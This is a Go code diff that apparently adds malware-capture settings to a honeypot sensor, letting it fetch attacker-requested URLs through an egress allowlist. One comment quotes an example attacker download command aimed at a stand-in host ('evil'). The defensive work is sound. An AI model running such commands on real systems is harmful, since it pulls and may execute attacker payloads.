@@ -686,6 +686,16 @@ type Payloads struct {
 	// MaxTotalMB caps the payloads directory with oldest-first rotation
 	// (default 256 MB).
 	MaxTotalMB int `yaml:"max_total_mb"`
+	// FetchURLs, when true, ACTIVELY downloads ingress-tool-transfer URLs an
+	// attacker tried to pull (e.g. "wget http://evil/x") and stores the real
+	// artifact — turning recorded intent into captured malware. The fetch goes
+	// through the egress allowlist (egress.enabled), so it can only reach
+	// destinations the operator explicitly permitted; point it at a dedicated
+	// analysis egress. Off by default — it makes the sensor initiate outbound
+	// connections, which most deployments don't want.
+	FetchURLs bool `yaml:"fetch_urls"`
+	// FetchMaxBytes caps a single actively-fetched download (default 16 MiB).
+	FetchMaxBytes int `yaml:"fetch_max_bytes"`
 }
 
 // GeoIP turns on country/city/ASN enrichment of source IPs using
